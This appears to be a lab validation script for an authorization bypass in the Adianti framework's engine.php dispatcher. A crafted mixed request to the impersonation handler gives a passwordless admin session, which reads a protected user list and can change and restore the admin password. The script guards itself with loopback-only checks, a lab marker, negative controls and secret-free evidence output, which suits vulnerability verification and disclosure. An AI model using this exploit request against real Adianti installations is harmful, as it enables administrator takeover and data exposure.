#!/usr/bin/env python3
"""Validate the Adianti dispatcher authorization lab on loopback only.

The default workflow proves passwordless administrator impersonation, reads a
synthetic protected user list, and runs fresh-session and post-logout negative
controls. ``--change-and-restore`` additionally changes the synthetic admin
password to an in-memory random value, validates the credential transition,
restores the supplied fixture password, and validates restoration.

Cookies, passwords, CSRF tokens, and response bodies are never written to the
JSON evidence file. The tool rejects non-loopback destinations and requires an
exact lab marker before exercising the modeled flaw.
"""

from __future__ import annotations

import argparse
import html
import http.cookiejar
import ipaddress
import json
import os
import secrets
import signal
import socket
import string
import sys
import time
from datetime import datetime, timezone
from html.parser import HTMLParser
from pathlib import Path
from typing import Any
from urllib import error, parse, request


LAB_ID = "adianti-74-dispatcher-lab-v1"
IMPERSONATION_CLASS = "SystemUserList"
IMPERSONATION_METHOD = "onImpersonation"
PROFILE_CLASS = "SystemProfileForm"
LOGIN_CLASS = "LoginForm"
CARRIER_CLASS = "SystemPasswordResetForm"
MAX_BODY_BYTES = 2 * 1024 * 1024


class ValidationError(RuntimeError):
    """Raised when an expected lab oracle is absent."""


class NoRedirect(request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001
        return None


class GridParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.headers: list[str] = []
        self.rows: list[list[str]] = []
        self._cell: list[str] | None = None
        self._row: list[str] | None = None
        self._header = False

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        del attrs
        if tag == "tr":
            self._row = []
        elif tag in {"th", "td"}:
            self._cell = []
            self._header = tag == "th"

    def handle_data(self, data: str) -> None:
        if self._cell is not None:
            self._cell.append(data)

    def handle_endtag(self, tag: str) -> None:
        if tag in {"th", "td"} and self._cell is not None:
            value = " ".join("".join(self._cell).split())
            if self._header:
                self.headers.append(value)
            elif self._row is not None:
                self._row.append(value)
            self._cell = None
        elif tag == "tr" and self._row is not None:
            if self._row:
                self.rows.append(self._row)
            self._row = None


class InputParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.fields: dict[str, str] = {}

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag != "input":
            return
        values = dict(attrs)
        name = values.get("name")
        if name:
            self.fields[html.unescape(name)] = html.unescape(values.get("value") or "")


def require(condition: bool, label: str) -> None:
    if not condition:
        raise ValidationError(label)
    print(f"PASS_{label}")


def clear_proxy_environment() -> None:
    for name in list(os.environ):
        if name.lower() in {
            "http_proxy",
            "https_proxy",
            "all_proxy",
            "no_proxy",
            "urllib_request_proxy",
        }:
            os.environ.pop(name, None)


def loopback_url(value: str, *, label: str = "URL") -> str:
    candidate = value.strip().rstrip("/")
    parsed = parse.urlsplit(candidate)
    if parsed.scheme != "http" or not parsed.hostname:
        raise argparse.ArgumentTypeError(f"{label} must be an absolute HTTP loopback URL")
    if parsed.username or parsed.password:
        raise argparse.ArgumentTypeError(f"{label} must not contain credentials")
    if parsed.path or parsed.query or parsed.fragment:
        raise argparse.ArgumentTypeError(f"{label} must not contain a path, query, or fragment")
    if parsed.hostname != "localhost":
        try:
            literal = ipaddress.ip_address(parsed.hostname)
        except ValueError as exc:
            raise argparse.ArgumentTypeError(
                f"{label} host must be localhost or a literal loopback address"
            ) from exc
        if not literal.is_loopback:
            raise argparse.ArgumentTypeError(f"{label} must use a loopback address")
    try:
        addresses = {
            item[4][0]
            for item in socket.getaddrinfo(parsed.hostname, parsed.port or 80, type=socket.SOCK_STREAM)
        }
    except socket.gaierror as exc:
        raise argparse.ArgumentTypeError(f"{label} host cannot be resolved") from exc
    if not addresses or any(not ipaddress.ip_address(address).is_loopback for address in addresses):
        raise argparse.ArgumentTypeError(f"{label} must resolve only to loopback")
    return parse.urlunsplit(("http", parsed.netloc, "", "", ""))


def base_url(value: str) -> str:
    return loopback_url(value, label="base URL")


def proxy_url(value: str) -> str:
    return loopback_url(value, label="proxy URL")


def build_opener(proxy: str | None, jar: http.cookiejar.CookieJar | None = None):
    handlers: list[Any] = [NoRedirect()]
    handlers.append(request.ProxyHandler({"http": proxy}) if proxy else request.ProxyHandler({}))
    if jar is not None:
        handlers.append(request.HTTPCookieProcessor(jar))
    return request.build_opener(*handlers)


def send(
    opener,
    records: list[dict[str, Any]],
    *,
    label: str,
    method: str,
    url: str,
    timeout: float,
    form: dict[str, str] | None = None,
) -> dict[str, Any]:
    payload = parse.urlencode(form).encode() if form is not None else None
    headers = {
        "Accept": "text/html,application/json;q=0.9,*/*;q=0.8",
        "Connection": "close",
        "User-Agent": "Adianti-Dispatcher-Lab-Validator/1.0",
    }
    if payload is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = request.Request(url, data=payload, headers=headers, method=method)
    started = time.monotonic()
    try:
        response = opener.open(req, timeout=timeout)
        raw = response.read(MAX_BODY_BYTES + 1)
        status = response.status
        response_headers = response.headers
    except error.HTTPError as exc:
        raw = exc.read(MAX_BODY_BYTES + 1)
        status = exc.code
        response_headers = exc.headers
    except (error.URLError, TimeoutError, OSError) as exc:
        raise ValidationError(f"transport_error_{label}:{exc}") from exc
    truncated = len(raw) > MAX_BODY_BYTES
    charset = response_headers.get_content_charset() or "utf-8"
    try:
        body = raw[:MAX_BODY_BYTES].decode(charset, errors="replace")
    except LookupError:
        body = raw[:MAX_BODY_BYTES].decode("utf-8", errors="replace")
    elapsed_ms = round((time.monotonic() - started) * 1000, 1)
    result = {
        "label": label,
        "status": status,
        "body": body,
        "body_length": len(raw),
        "body_truncated": truncated,
        "elapsed_ms": elapsed_ms,
    }
    records.append({key: value for key, value in result.items() if key != "body"})
    print(f"{label}: HTTP {status} ({elapsed_ms:.1f} ms)")
    return result


def endpoint(origin: str, class_name: str, method: str | None = None, *, static: bool = True) -> str:
    values: dict[str, str] = {"class": class_name}
    if method:
        values["method"] = method
    if static:
        values["static"] = "1"
    return f"{origin}/engine.php?{parse.urlencode(values)}"


def permission_denied(body: str) -> bool:
    return "Permissão negada" in body


def login_success(body: str) -> bool:
    return "__adianti_load_page('index.php')" in body and "__adianti_error" not in body


def invalid_password(body: str) -> bool:
    return "Senha inválida" in body


def form_fields(body: str) -> dict[str, str]:
    parser = InputParser()
    parser.feed(body)
    return parser.fields


def grid(body: str) -> dict[str, Any]:
    parser = GridParser()
    parser.feed(body)
    return {"headers": parser.headers, "rows": parser.rows}


def strong_password(length: int = 32) -> str:
    groups = (string.ascii_lowercase, string.ascii_uppercase, string.digits, "!@#$%^*-_=+")
    chars = [secrets.choice(group) for group in groups]
    alphabet = "".join(groups)
    chars.extend(secrets.choice(alphabet) for _ in range(length - len(chars)))
    secrets.SystemRandom().shuffle(chars)
    return "".join(chars)


def login_request(args, records, password: str, label: str, *, jar=None):
    opener = build_opener(args.proxy, jar)
    response = send(
        opener,
        records,
        label=label,
        method="POST",
        url=endpoint(args.base_url, LOGIN_CLASS, "onLogin"),
        timeout=args.timeout,
        form={"login": args.login, "password": password},
    )
    return opener, response


def logout(args, records, opener, label: str) -> None:
    response = send(
        opener,
        records,
        label=label,
        method="GET",
        url=endpoint(args.base_url, LOGIN_CLASS, "onLogout"),
        timeout=args.timeout,
    )
    require(
        response["status"] == 200 and "index.php?class=LoginForm" in response["body"],
        f"{label}_completed",
    )


def read_profile(args, records, opener, label: str) -> dict[str, str]:
    response = send(
        opener,
        records,
        label=label,
        method="GET",
        url=endpoint(args.base_url, PROFILE_CLASS, "onEdit", static=False),
        timeout=args.timeout,
    )
    fields = form_fields(response["body"])
    require(response["status"] == 200 and "LAB_PROFILE_FORM" in response["body"], f"{label}_rendered")
    require(fields.get("login") == args.login, f"{label}_identity_matches")
    require(len(fields.get("csrf_token", "")) == 64, f"{label}_csrf_present")
    return fields


def passwordless_session(args, records, label: str):
    jar = http.cookiejar.CookieJar()
    opener = build_opener(args.proxy, jar)
    response = send(
        opener,
        records,
        label=label,
        method="POST",
        url=endpoint(args.base_url, IMPERSONATION_CLASS, IMPERSONATION_METHOD),
        timeout=args.timeout,
        form={"class": CARRIER_CLASS, "method": "run", "static": "1", "login": args.login},
    )
    require(
        response["status"] == 200 and "index.php?class=EmptyPage" in response["body"],
        f"{label}_transition",
    )
    return opener


def save_password(args, records, opener, fields: dict[str, str], password: str, label: str) -> None:
    response = send(
        opener,
        records,
        label=label,
        method="POST",
        url=endpoint(args.base_url, PROFILE_CLASS, "onSave", static=False),
        timeout=args.timeout,
        form={
            "csrf_token": fields["csrf_token"],
            "name": fields["name"],
            "login": fields["login"],
            "email": fields["email"],
            "password1": password,
            "password2": password,
        },
    )
    require(response["status"] == 200 and "LAB_RECORD_SAVED" in response["body"], f"{label}_saved")


def prove_login_and_profile(args, records, password: str, label: str):
    jar = http.cookiejar.CookieJar()
    opener, response = login_request(args, records, password, f"{label}_login", jar=jar)
    require(response["status"] == 200 and login_success(response["body"]), f"{label}_login_accepted")
    fields = read_profile(args, records, opener, f"{label}_profile")
    return opener, fields


def attempt_restore(args, records, original: str, replacement: str) -> bool:
    print("RECOVERY_attempting_fixture_password_restore", file=sys.stderr)
    try:
        jar = http.cookiejar.CookieJar()
        opener, response = login_request(args, records, replacement, "recovery_replacement_login", jar=jar)
        if login_success(response["body"]):
            fields = read_profile(args, records, opener, "recovery_profile")
            save_password(args, records, opener, fields, original, "recovery_restore")
            logout(args, records, opener, "recovery_logout")
        else:
            _, original_response = login_request(args, records, original, "recovery_original_probe")
            if not login_success(original_response["body"]):
                return False

        verify_jar = http.cookiejar.CookieJar()
        verify, response = login_request(args, records, original, "recovery_original_verify", jar=verify_jar)
        if not login_success(response["body"]):
            return False
        fields = read_profile(args, records, verify, "recovery_original_profile")
        logout(args, records, verify, "recovery_original_logout")
        return fields.get("login") == args.login
    except Exception as exc:  # recovery must report, not mask, the primary failure
        print(f"RECOVERY_failed:{exc}", file=sys.stderr)
        return False


def run_read_flow(args, records) -> dict[str, Any]:
    marker = send(
        build_opener(args.proxy),
        records,
        label="lab_marker",
        method="GET",
        url=f"{args.base_url}/manifest.json",
        timeout=args.timeout,
    )
    try:
        marker_data = json.loads(marker["body"])
    except json.JSONDecodeError as exc:
        raise ValidationError("lab_marker_invalid_json") from exc
    require(marker["status"] == 200 and marker_data.get("lab_id") == LAB_ID, "exact_lab_marker")

    direct = send(
        build_opener(args.proxy),
        records,
        label="direct_impersonation_control",
        method="POST",
        url=endpoint(args.base_url, IMPERSONATION_CLASS, IMPERSONATION_METHOD),
        timeout=args.timeout,
        form={"login": args.login},
    )
    require(direct["status"] in {401, 403} and permission_denied(direct["body"]), "direct_route_denied")

    exploit = passwordless_session(args, records, "mixed_passwordless_impersonation")
    page = send(
        exploit,
        records,
        label="admin_user_list_passwordless_session",
        method="GET",
        url=endpoint(args.base_url, IMPERSONATION_CLASS, static=False),
        timeout=args.timeout,
    )
    require(page["status"] == 200 and "LAB_ADMIN_USER_LIST" in page["body"], "admin_user_list_reached")
    disclosure = grid(page["body"])
    require(disclosure["headers"] == ["ID", "Nome", "Login", "Email", "Perfil", "Ativo"], "admin_list_columns_exact")
    logins = [row[2] for row in disclosure["rows"] if len(row) >= 6]
    require(args.login in logins and "analyst" in logins, "admin_list_synthetic_rows_exact")
    output = Path(args.page_output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(page["body"], encoding="utf-8")

    fields = read_profile(args, records, exploit, "passwordless_profile")
    identity = {name: fields[name] for name in ("name", "login", "email")}

    fresh = send(
        build_opener(args.proxy),
        records,
        label="admin_user_list_fresh_session",
        method="GET",
        url=endpoint(args.base_url, IMPERSONATION_CLASS, static=False),
        timeout=args.timeout,
    )
    require(fresh["status"] in {401, 403} and permission_denied(fresh["body"]), "fresh_session_denied")
    logout(args, records, exploit, "passwordless_session_logout")
    after = send(
        exploit,
        records,
        label="admin_user_list_after_logout",
        method="GET",
        url=endpoint(args.base_url, IMPERSONATION_CLASS, static=False),
        timeout=args.timeout,
    )
    require(after["status"] in {401, 403} and permission_denied(after["body"]), "post_logout_denied")
    return {"headers": disclosure["headers"], "row_count": len(disclosure["rows"]), "identity": identity}


def run_change_and_restore(
    args,
    records,
    original: str,
    state: dict[str, Any],
    secrets_to_exclude: list[str],
) -> dict[str, Any]:
    replacement = strong_password()
    secrets_to_exclude.append(replacement)
    may_be_changed = False
    restored = False
    try:
        original_session, before = prove_login_and_profile(args, records, original, "original_before_change")
        state["original_authenticated_before_change"] = True
        snapshot = {name: before[name] for name in ("name", "login", "email")}
        logout(args, records, original_session, "original_before_change_logout")

        _, negative = login_request(args, records, replacement, "replacement_before_change_control")
        require(negative["status"] == 200 and invalid_password(negative["body"]), "replacement_rejected_before_change")

        exploit = passwordless_session(args, records, "mixed_impersonation_for_change")
        fields = read_profile(args, records, exploit, "profile_for_change")
        bad = send(
            exploit,
            records,
            label="invalid_csrf_control",
            method="POST",
            url=endpoint(args.base_url, PROFILE_CLASS, "onSave", static=False),
            timeout=args.timeout,
            form={
                "csrf_token": "0" * 64,
                "name": fields["name"],
                "login": fields["login"],
                "email": fields["email"],
                "password1": replacement,
                "password2": replacement,
            },
        )
        require(bad["status"] == 403 and "LAB_CSRF_REJECTED" in bad["body"], "invalid_csrf_rejected")
        state["invalid_csrf_rejected"] = True

        logout(args, records, exploit, "invalid_csrf_control_logout")
        original_after_invalid, unchanged = prove_login_and_profile(
            args, records, original, "original_after_invalid_csrf"
        )
        require(
            {name: unchanged[name] for name in ("name", "login", "email")} == snapshot,
            "profile_identity_unchanged_after_invalid_csrf",
        )
        logout(args, records, original_after_invalid, "original_after_invalid_csrf_logout")
        _, replacement_after_invalid = login_request(
            args, records, replacement, "replacement_after_invalid_csrf_control"
        )
        require(
            replacement_after_invalid["status"] == 200
            and invalid_password(replacement_after_invalid["body"]),
            "password_unchanged_after_invalid_csrf",
        )

        exploit = passwordless_session(args, records, "mixed_impersonation_for_valid_change")
        fields = read_profile(args, records, exploit, "profile_for_valid_change")

        may_be_changed = True
        save_password(args, records, exploit, fields, replacement, "temporary_password_change")
        logout(args, records, exploit, "temporary_password_change_logout")

        _, old = login_request(args, records, original, "original_after_change_control")
        require(old["status"] == 200 and invalid_password(old["body"]), "original_rejected_after_change")
        state["original_rejected_after_change"] = True

        replacement_session, changed = prove_login_and_profile(args, records, replacement, "replacement_after_change")
        state["replacement_authenticated_after_change"] = True
        require(
            {name: changed[name] for name in ("name", "login", "email")} == snapshot,
            "profile_identity_unchanged_after_change",
        )
        save_password(args, records, replacement_session, changed, original, "fixture_password_restore")
        logout(args, records, replacement_session, "fixture_password_restore_logout")

        _, replacement_after = login_request(args, records, replacement, "replacement_after_restore_control")
        require(
            replacement_after["status"] == 200 and invalid_password(replacement_after["body"]),
            "replacement_rejected_after_restore",
        )
        state["replacement_rejected_after_restore"] = True

        final_session, final_fields = prove_login_and_profile(args, records, original, "original_after_restore")
        state["original_authenticated_after_restore"] = True
        require(
            {name: final_fields[name] for name in ("name", "login", "email")} == snapshot,
            "profile_identity_preserved",
        )
        state["profile_identity_preserved"] = True
        logout(args, records, final_session, "original_after_restore_logout")
        restored = True
        may_be_changed = False
        state["restored"] = True
        return state
    finally:
        if may_be_changed and not restored:
            state["restored"] = attempt_restore(args, records, original, replacement)


def write_evidence(args, records, disclosure, change, verdict: str, note: str, secrets_to_exclude: list[str]) -> None:
    evidence = {
        "schema": "adianti-dispatcher-lab/f001-v2",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "lab_id": LAB_ID,
        "origin": args.base_url,
        "proxy_enabled": bool(args.proxy),
        "request_count": len(records),
        "credentials_or_session_material_recorded": False,
        "disclosure": disclosure,
        "password_change": change,
        "requests": records,
        "classification": {"verdict": verdict, "note": note},
    }
    serialized = json.dumps(evidence, ensure_ascii=False, indent=2) + "\n"
    for secret in secrets_to_exclude:
        if secret and secret in serialized:
            raise ValidationError("secret_detected_in_evidence")
    path = Path(args.output)
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(serialized, encoding="utf-8")
    os.replace(temporary, path)
    print(f"evidence: {path}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Validate the loopback-only Adianti dispatcher lab")
    parser.add_argument("--base-url", type=base_url, default="http://127.0.0.1:18080")
    parser.add_argument("--login", choices=("admin",), default="admin")
    parser.add_argument("--proxy", type=proxy_url, help="loopback HTTP proxy, e.g. http://127.0.0.1:8080")
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument("--page-output", default="artifacts/f001-admin-users-page.html")
    parser.add_argument("--output", default="artifacts/f001-admin-access.json")
    parser.add_argument("--change-and-restore", action="store_true")
    parser.add_argument("--current-password", help="known synthetic fixture password; may use LAB_CURRENT_PASSWORD")
    return parser


def main() -> int:
    args = build_parser().parse_args()
    if args.timeout <= 0 or args.timeout > 120:
        raise SystemExit("--timeout must be greater than 0 and at most 120")
    original = args.current_password or os.environ.get("LAB_CURRENT_PASSWORD")
    if args.change_and_restore and not original:
        raise SystemExit("--change-and-restore requires --current-password or LAB_CURRENT_PASSWORD")
    if original and len(original) > 256:
        raise SystemExit("fixture password is unexpectedly long")

    clear_proxy_environment()
    records: list[dict[str, Any]] = []
    disclosure: dict[str, Any] = {}
    change: dict[str, Any] = {
        "requested": bool(args.change_and_restore),
        "original_authenticated_before_change": False,
        "invalid_csrf_rejected": False,
        "original_rejected_after_change": False,
        "replacement_authenticated_after_change": False,
        "restored": False if args.change_and_restore else None,
        "replacement_rejected_after_restore": False,
        "original_authenticated_after_restore": False,
        "profile_identity_preserved": False,
    }
    verdict = "validation_failed"
    note = "Validation did not complete."
    exit_code = 1
    secrets_to_exclude = [original or ""]

    def interrupted(signum, frame):  # noqa: ANN001
        del signum, frame
        raise KeyboardInterrupt

    signal.signal(signal.SIGTERM, interrupted)

    try:
        disclosure = run_read_flow(args, records)
        verdict = "passwordless_admin_access_confirmed"
        note = "Direct and fresh sessions were denied; mixed dispatch created an admin session that read synthetic protected data."
        if args.change_and_restore:
            change = run_change_and_restore(args, records, original, change, secrets_to_exclude)
            require(bool(change.get("restored")), "fixture_password_restored")
            verdict = "passwordless_admin_access_and_reversible_password_change_confirmed"
            note = "The temporary password transition was proven and the original synthetic fixture password was restored and revalidated."
        exit_code = 0
    except KeyboardInterrupt:
        verdict = "interrupted"
        note = "The run was interrupted; inspect the restoration markers and reset the disposable volume if needed."
        print("FAIL_interrupted", file=sys.stderr)
    except ValidationError as exc:
        verdict = "validation_failed"
        note = str(exc)
        print(f"FAIL_{exc}", file=sys.stderr)
    finally:
        try:
            write_evidence(args, records, disclosure, change, verdict, note, secrets_to_exclude)
        except Exception as exc:
            print(f"FAIL_evidence_write:{exc}", file=sys.stderr)
            exit_code = 1

    print(f"verdict: {verdict}")
    print(f"RESULT_request_count:{len(records)}")
    print(f"RESULT_password_restored:{change.get('restored')}")
    return exit_code


if __name__ == "__main__":
    sys.exit(main())
